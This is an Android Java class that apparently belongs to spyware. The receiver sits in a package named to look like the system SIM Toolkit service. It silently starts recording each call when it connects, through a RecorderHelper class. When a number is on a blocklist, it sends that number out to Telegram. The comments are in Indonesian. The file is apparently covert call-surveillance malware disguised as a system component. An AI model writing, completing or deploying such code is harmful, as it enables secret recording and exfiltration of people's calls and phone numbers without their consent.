package com.android.stk.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver {

    private static boolean isRecording = false;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

        if (state == null) return;

        // Ketika panggilan dimulai (OFFHOOK = sedang menelpon)
        if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            if (!isRecording) {

                // 🔒 Cek apakah nomor ini diblokir
                if (number != null && BlocklistHelper.isBlocked(context, number)) {
                    TelegramSender.sendText("⚠️ Panggilan dari nomor diblok: " + number);
                    return;
                }

                isRecording = true;
                RecorderHelper.startRecording(context, number);
            }
        }

        // Ketika panggilan selesai (IDLE = tidak menelpon)
        if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            if (isRecording) {
                isRecording = false;
                RecorderHelper.stopRecording(context);
            }
        }
    }
}
